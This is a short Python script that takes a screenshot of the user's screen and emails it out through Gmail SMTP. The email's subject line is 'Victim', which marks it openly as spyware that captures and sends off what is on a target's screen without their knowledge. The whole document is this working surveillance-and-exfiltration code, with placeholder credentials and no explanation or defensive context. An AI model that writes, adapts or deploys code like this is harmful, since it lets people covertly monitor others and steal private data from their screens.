import smtplib, pyautogui
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
x = pyautogui.screenshot('C:/Users/Public/scst.png')
print(x)

def pro():
    msg = MIMEMultipart()
    msg['Subject'] = "Victim"
    body = "Screenshot"

    msg.attach(MIMEText(body, 'plain'))

# open the file to be sent
    filename ='C:/Users/Public/scst.png'
    attachment = open(filename, "rb")

    p = MIMEBase('application', 'octet-stream')

    p.set_payload(attachment.read())
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login('senders email', "password")
    text = msg.as_string()
    s.sendmail('sender', 'receiver', text)
    s.quit
    print('Success')
pro()
